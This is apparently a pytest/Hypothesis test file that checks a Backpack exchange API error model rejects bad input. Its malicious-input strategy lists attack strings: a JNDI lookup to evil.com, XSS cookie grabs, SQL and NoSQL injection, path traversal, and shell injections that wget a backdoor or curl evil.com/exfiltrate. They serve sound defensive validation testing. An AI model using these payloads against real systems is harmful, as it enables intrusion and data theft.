"""Property-based tests for Backpack raw error models.

These tests validate critical security boundary models that process external error response data.
The models tested here are essential for error handling, API failure processing, and reliability.

SECURITY CRITICAL: These raw models protect against:
- Malicious error response data that could manipulate error handling
- Buffer overflow attacks through oversized error messages
- Injection attacks through malformed error structures
- Error code manipulation that could affect error processing
- Message manipulation that could affect logging and monitoring

Property testing ensures comprehensive coverage of error edge cases and adversarial inputs.
"""

import json
from typing import Any, Literal, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_error import BackpackRawApiError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# Type alias for security testing malicious values
MaliciousValue = float | bool | str | list[str] | dict[str, str] | bytes | None

# =============================================================================
# HYPOTHESIS STRATEGIES FOR ERROR MODEL TESTING
# =============================================================================


def error_code_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack error code strings.

    Returns:
        A Hypothesis strategy for error code strings.
    """
    return st.sampled_from([
        # Authentication errors
        "INVALID_SIGNATURE",
        "MISSING_SIGNATURE",
        "INVALID_API_KEY",
        "EXPIRED_API_KEY",
        "INSUFFICIENT_PERMISSIONS",
        # Order errors
        "INSUFFICIENT_BALANCE",
        "INVALID_ORDER_TYPE",
        "INVALID_SYMBOL",
        "ORDER_NOT_FOUND",
        "PRICE_TOO_LOW",
        "PRICE_TOO_HIGH",
        "QUANTITY_TOO_SMALL",
        "QUANTITY_TOO_LARGE",
        # Market errors
        "MARKET_CLOSED",
        "TRADING_DISABLED",
        "SYMBOL_NOT_FOUND",
        # Rate limiting
        "RATE_LIMIT_EXCEEDED",
        "TOO_MANY_REQUESTS",
        # System errors
        "INTERNAL_ERROR",
        "SERVICE_UNAVAILABLE",
        "MAINTENANCE_MODE",
    ])


def error_message_strategy() -> SearchStrategy[str]:
    """Generate valid error message strings.

    Returns:
        A Hypothesis strategy for error message strings.
    """
    return st.one_of([
        # Common error messages
        st.just("Signature is invalid or expired."),
        st.just("Insufficient balance for this operation."),
        st.just("Invalid order type specified."),
        st.just("Symbol not found or not tradeable."),
        st.just("Rate limit exceeded. Please try again later."),
        st.just("Internal server error occurred."),
        # Generated messages
        st.text(
            min_size=5,
            max_size=512,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd", "Pc", "Pd", "Pe", "Pf", "Pi", "Po", "Ps"],
                whitelist_characters=" \t\n",
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 1024),
        # Messages with special characters
        st.just("Error: Operation failed! 😞"),
        st.just("Price must be > 0.00 and < 1,000,000.00"),
        st.just("Symbol 'BTC-USDC' is not available."),
        st.just("Order #12345 was not found in the system."),
        # Longer messages
        st.just(
            "The requested operation could not be completed due to insufficient funds. "
            "Please deposit more funds and try again."
        ),
        st.just(
            "Your API key does not have sufficient permissions to perform this action. "
            "Please contact support or use an API key with appropriate permissions."
        ),
    ])


@st.composite
def valid_api_error_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid API error data.

    Returns:
        A dictionary with valid API error data.
    """
    return {
        "code": draw(error_code_strategy()),
        "message": draw(error_message_strategy()),
    }


def malicious_error_strategy() -> SearchStrategy[MaliciousValue]:
    """Generate malicious values for error security testing.

    Returns:
        A Hypothesis strategy for malicious error values.
    """
    return st.one_of([
        # Error manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-errors}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('error-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE errors;--"),
        st.just("1' UNION SELECT * FROM users--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("E" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.errors.find(); //"),
        # JSON injection
        st.just('{"$where": "this.code == \'ADMIN\'"}'),
        # Error code manipulation
        st.just("INVALID_SIGNATURE'; INSERT INTO errors VALUES('BYPASS');--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW API ERROR MODEL
# =============================================================================


class TestBackpackRawApiErrorProperties:
    """Property-based tests for BackpackRawApiError validation and security."""

    @given(error_data=valid_api_error_data())
    def test_api_error_validation_success_properties(self, error_data: dict[str, Any]) -> None:
        """Property: Valid API error data should always create valid BackpackRawApiError objects."""
        # Skip empty or invalid strings
        for field in ["code", "message"]:
            value = error_data[field]
            assume(isinstance(value, str) and value.strip())
            assume(len(value.encode("utf-8")) <= 1024)

        obj = BackpackRawApiError.model_validate(error_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawApiError)

        # Property: All fields should be preserved with correct types
        assert obj.code == error_data["code"]
        assert obj.message == error_data["message"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("validate_by_name") is True

    @given(
        field_name=st.sampled_from(["code", "message"]), malicious_value=malicious_error_strategy()
    )
    def test_api_error_security_boundary_properties(
        self, field_name: str, malicious_value: MaliciousValue
    ) -> None:
        """Property: API error model should reject malicious inputs safely."""
        base_data = {
            "code": "INVALID_SIGNATURE",
            "message": "Signature is invalid or expired.",
        }
        # Type annotation allows malicious testing - runtime will validate
        base_data[field_name] = cast(str, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawApiError.model_validate(base_data)

    @given(
        field_name=st.sampled_from(["code", "message"]),
        empty_value=st.one_of([
            st.just(""),
            st.just("   "),
            st.just("\t"),
            st.just("\n"),
            st.just("\r"),
        ]),
    )
    def test_api_error_empty_string_validation_properties(
        self, field_name: str, empty_value: str
    ) -> None:
        """Property: API error fields should reject empty strings."""
        error_data = {
            "code": "INVALID_SIGNATURE",
            "message": "Signature is invalid or expired.",
        }
        error_data[field_name] = empty_value

        # Property: Empty strings should be rejected
        with pytest.raises(EmptyStringError):
            BackpackRawApiError.model_validate(error_data)

    @given(
        field_name=st.sampled_from(["code", "message"]),
        null_value=st.one_of([
            st.none(),
            st.integers(),
            st.floats(),
            st.booleans(),
            st.lists(st.text()),
            st.dictionaries(st.text(), st.text()),
        ]),
    )
    def test_api_error_type_validation_properties(
        self, field_name: str, null_value: MaliciousValue
    ) -> None:
        """Property: API error fields should reject non-string types."""
        error_data = {
            "code": "INVALID_SIGNATURE",
            "message": "Signature is invalid or expired.",
        }
        # Type annotation allows malicious testing - runtime will validate
        error_data[field_name] = cast(str, null_value)

        # Property: Non-string types should be rejected
        with pytest.raises(TypeError):
            BackpackRawApiError.model_validate(error_data)

    @given(
        code=error_code_strategy(),
        invalid_code=st.text().filter(
            lambda x: x
            not in {
                "INVALID_SIGNATURE",
                "MISSING_SIGNATURE",
                "INVALID_API_KEY",
                "EXPIRED_API_KEY",
                "INSUFFICIENT_PERMISSIONS",
                "INSUFFICIENT_BALANCE",
                "INVALID_ORDER_TYPE",
                "INVALID_SYMBOL",
                "ORDER_NOT_FOUND",
                "PRICE_TOO_LOW",
                "PRICE_TOO_HIGH",
                "QUANTITY_TOO_SMALL",
                "QUANTITY_TOO_LARGE",
                "MARKET_CLOSED",
                "TRADING_DISABLED",
                "SYMBOL_NOT_FOUND",
                "RATE_LIMIT_EXCEEDED",
                "TOO_MANY_REQUESTS",
                "INTERNAL_ERROR",
                "SERVICE_UNAVAILABLE",
                "MAINTENANCE_MODE",
            }
        ),
    )
    def test_api_error_code_validation_properties(self, code: str, invalid_code: str) -> None:
        """Property: API error codes should validate against known error codes."""
        valid_data = {
            "code": code,
            "message": "Test error message.",
        }

        # Property: Valid error codes should be accepted
        obj = BackpackRawApiError.model_validate(valid_data)
        assert obj.code == code

        # Property: Invalid error codes should be rejected (if not empty)
        if invalid_code.strip():
            invalid_data = valid_data.copy()
            invalid_data["code"] = invalid_code

            with pytest.raises(ValidationError):
                BackpackRawApiError.model_validate(invalid_data)

    @given(error_data=valid_api_error_data())
    def test_api_error_extra_fields_properties(self, error_data: dict[str, Any]) -> None:
        """Property: API error model should forbid extra fields."""
        # Skip invalid data
        for field in ["code", "message"]:
            assume(isinstance(error_data[field], str) and error_data[field].strip())

        # Add extra fields
        error_data_with_extra = error_data.copy()
        error_data_with_extra["extra"] = "forbidden"
        error_data_with_extra["details"] = {"info": "additional"}

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            BackpackRawApiError.model_validate(error_data_with_extra)

    @given(message_length=st.integers(min_value=1025, max_value=10000))
    def test_api_error_message_length_validation_properties(self, message_length: int) -> None:
        """Property: API error messages should reject oversized content."""
        error_data = {
            "code": "INTERNAL_ERROR",
            "message": "A" * message_length,
        }

        # Property: Oversized messages should be rejected
        with pytest.raises(TypeFieldError):
            BackpackRawApiError.model_validate(error_data)

    @given(
        unicode_category=st.sampled_from(["Cc", "Cf", "Co", "Cs"]),  # Control characters
        base_message=st.text(min_size=5, max_size=20),
        control_char=st.characters(whitelist_categories=["Cc", "Cf", "Co", "Cs"]),
    )
    def test_api_error_control_character_handling_properties(
        self, unicode_category: str, base_message: str, control_char: str
    ) -> None:
        """Property: API error should handle control characters appropriately."""
        message_with_control = f"Error: {base_message}{control_char} occurred"

        error_data = {
            "code": "INTERNAL_ERROR",
            "message": message_with_control,
        }

        try:
            # Property: Control characters may be accepted in messages (depends on validation)
            obj = BackpackRawApiError.model_validate(error_data)
            assert obj.code == "INTERNAL_ERROR"
            assert base_message in obj.message
        except (ValidationError, TypeFieldError):
            # Property: Or they may be rejected for security
            pass

    @given(error_data=valid_api_error_data())
    def test_api_error_json_serialization_properties(self, error_data: dict[str, Any]) -> None:
        """Property: API error should maintain JSON serialization compatibility."""
        # Skip invalid data
        for field in ["code", "message"]:
            assume(isinstance(error_data[field], str) and error_data[field].strip())
            assume(len(error_data[field].encode("utf-8")) <= 1024)

        obj = BackpackRawApiError.model_validate(error_data)

        # Property: Object should be JSON serializable
        json_str = obj.model_dump_json()
        parsed_json = json.loads(json_str)

        # Property: Serialized data should match original
        assert parsed_json["code"] == error_data["code"]
        assert parsed_json["message"] == error_data["message"]

        # Property: Should be able to reconstruct from JSON
        reconstructed = BackpackRawApiError.model_validate(parsed_json)
        assert reconstructed.code == obj.code
        assert reconstructed.message == obj.message


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestBackpackRawApiErrorIntegrationProperties:
    """Integration property tests for API error model scenarios."""

    @given(errors_data=st.lists(valid_api_error_data(), min_size=1, max_size=10))
    def test_multiple_errors_validation_properties(self, errors_data: list[dict[str, Any]]) -> None:
        """Property: Multiple API errors should validate independently."""
        # Skip invalid data
        for error_data in errors_data:
            for field in ["code", "message"]:
                assume(isinstance(error_data[field], str) and error_data[field].strip())
                assume(len(error_data[field].encode("utf-8")) <= 1024)

        # Property: All errors should validate successfully
        error_objects: list[BackpackRawApiError] = []
        for error_data in errors_data:
            obj = BackpackRawApiError.model_validate(error_data)
            error_objects.append(obj)

        # Property: All objects should be properly typed
        for obj in error_objects:
            assert isinstance(obj, BackpackRawApiError)

        # Property: Each object should preserve its data
        for obj, original_data in zip(error_objects, errors_data, strict=False):
            assert obj.code == original_data["code"]
            assert obj.message == original_data["message"]

    @given(code=error_code_strategy(), malicious_message=malicious_error_strategy())
    def test_mixed_valid_invalid_properties(
        self, code: str, malicious_message: MaliciousValue
    ) -> None:
        """Property: Valid code with malicious message should be rejected."""
        error_data = {
            "code": code,
            "message": malicious_message,
        }

        # Property: Mixed valid/invalid should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawApiError.model_validate(error_data)

    @given(malicious_code=malicious_error_strategy(), message=error_message_strategy())
    def test_malicious_code_valid_message_properties(
        self, malicious_code: MaliciousValue, message: str
    ) -> None:
        """Property: Malicious code with valid message should be rejected."""
        # Skip invalid message data
        assume(message.strip())
        assume(len(message.encode("utf-8")) <= 1024)

        error_data = {
            "code": malicious_code,
            "message": message,
        }

        # Property: Mixed invalid/valid should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawApiError.model_validate(error_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawApiError_real_world_example() -> None:
    """Test with real-world API error data."""
    payload = {
        "code": "INVALID_SIGNATURE",
        "message": "Signature is invalid or expired.",
    }
    obj = BackpackRawApiError.model_validate(payload)
    assert obj.code == "INVALID_SIGNATURE"
    assert obj.message == "Signature is invalid or expired."


def test_BackpackRawApiError_authentication_error_example() -> None:
    """Test with authentication error."""
    payload = {
        "code": "INSUFFICIENT_PERMISSIONS",
        "message": "Your API key does not have sufficient permissions to perform this action.",
    }
    obj = BackpackRawApiError.model_validate(payload)
    assert obj.code == "INSUFFICIENT_PERMISSIONS"
    assert "permissions" in obj.message


def test_BackpackRawApiError_trading_error_example() -> None:
    """Test with trading error."""
    payload = {
        "code": "INSUFFICIENT_BALANCE",
        "message": "Insufficient balance for this operation.",
    }
    obj = BackpackRawApiError.model_validate(payload)
    assert obj.code == "INSUFFICIENT_BALANCE"
    assert "balance" in obj.message


def test_BackpackRawApiError_rate_limit_error_example() -> None:
    """Test with rate limit error."""
    payload = {
        "code": "RATE_LIMIT_EXCEEDED",
        "message": "Rate limit exceeded. Please try again later.",
    }
    obj = BackpackRawApiError.model_validate(payload)
    assert obj.code == "RATE_LIMIT_EXCEEDED"
    assert "rate limit" in obj.message.lower()


def test_BackpackRawApiError_system_error_example() -> None:
    """Test with system error."""
    payload = {
        "code": "INTERNAL_ERROR",
        "message": "Internal server error occurred. Please try again or contact support.",
    }
    obj = BackpackRawApiError.model_validate(payload)
    assert obj.code == "INTERNAL_ERROR"
    assert "internal" in obj.message.lower()


def test_BackpackRawApiError_unicode_message_example() -> None:
    """Test with unicode characters in message."""
    payload = {
        "code": "INVALID_SYMBOL",
        "message": "Symbol 'BTC-USDC' is not available. 😞",
    }
    obj = BackpackRawApiError.model_validate(payload)
    assert obj.code == "INVALID_SYMBOL"
    assert "😞" in obj.message


def test_BackpackRawApiError_missing_required_fields() -> None:
    """Test BackpackRawApiError missing required fields."""
    base_data = {
        "code": "INVALID_SIGNATURE",
        "message": "Signature is invalid or expired.",
    }

    for field in ["code", "message"]:
        error_data = base_data.copy()
        del error_data[field]
        with pytest.raises(ValidationError):
            BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_wrong_type_fields() -> None:
    """Test BackpackRawApiError wrong type fields."""
    # Test integer code
    error_data = {
        "code": 123,
        "message": "Signature is invalid or expired.",
    }
    with pytest.raises(TypeError):
        BackpackRawApiError.model_validate(error_data)

    # Test list message
    error_data = {
        "code": "INVALID_SIGNATURE",
        "message": ["notastring"],
    }
    with pytest.raises(TypeError):
        BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_invalid_format_fields() -> None:
    """Test BackpackRawApiError invalid format fields."""
    # Test empty code
    error_data = {
        "code": "",
        "message": "Signature is invalid or expired.",
    }
    with pytest.raises(EmptyStringError):
        BackpackRawApiError.model_validate(error_data)

    # Test empty message
    error_data = {
        "code": "INVALID_SIGNATURE",
        "message": "",
    }
    with pytest.raises(EmptyStringError):
        BackpackRawApiError.model_validate(error_data)

    # Test invalid error code
    error_data = {
        "code": "NOT_A_REAL_CODE",
        "message": "Signature is invalid or expired.",
    }
    with pytest.raises(ValidationError):
        BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_extra_field() -> None:
    """Test BackpackRawApiError extra field."""
    error_data = {
        "code": "INVALID_SIGNATURE",
        "message": "Signature is invalid or expired.",
        "foo": 1,
    }
    with pytest.raises(ValidationError):
        BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_corruption_cases() -> None:
    """Test BackpackRawApiError corruption cases."""
    # Null required field
    error_data = {
        "code": None,
        "message": "Signature is invalid or expired.",
    }
    with pytest.raises(TypeError):
        BackpackRawApiError.model_validate(error_data)

    # Unicode/control chars (may be accepted)
    error_data = {
        "code": "INTERNAL_ERROR",
        "message": "Signature\x00invalid",
    }
    obj = BackpackRawApiError.model_validate(error_data)
    assert "Signature" in obj.message

    # Excessive length
    error_data = {
        "code": "INTERNAL_ERROR",
        "message": "A" * 1500,
    }
    with pytest.raises(TypeFieldError):
        BackpackRawApiError.model_validate(error_data)

    # Truncated JSON
    bad_json = '{"code": "INVALID_SIGNATURE"'
    with pytest.raises(json.JSONDecodeError):
        json.loads(bad_json)


def test_BackpackRawApiError_corruption_null_code() -> None:
    """Should fail: null value for required 'code'."""
    error_data = {
        "code": None,
        "message": "Signature is invalid or expired.",
    }
    with pytest.raises(TypeError):
        BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_corruption_binary_message() -> None:
    """Should fail: binary data for 'message'."""
    error_data = {
        "code": "INTERNAL_ERROR",
        "message": b"\x00\x01",
    }
    with pytest.raises(TypeError):
        BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_corruption_nested_code() -> None:
    """Should fail: nested object for 'code'."""
    error_data = {
        "code": {"foo": "bar"},
        "message": "Signature is invalid or expired.",
    }
    with pytest.raises(TypeError):
        BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_corruption_list_message() -> None:
    """Should fail: list for 'message'."""
    error_data = {
        "code": "INTERNAL_ERROR",
        "message": ["Signature is invalid or expired."],
    }
    with pytest.raises(TypeError):
        BackpackRawApiError.model_validate(error_data)


def test_BackpackRawApiError_corruption_garbled_unicode_code() -> None:
    """Should fail: garbled unicode in 'code' is rejected by the raw model."""
    garbled = b"INVALID_SIGNATURE\\udce2\\udc28\\udc00".decode("unicode-escape")
    error_data = {
        "code": garbled,
        "message": "Signature is invalid or expired.",
    }
    with pytest.raises(TypeFieldError):
        BackpackRawApiError.model_validate(error_data)
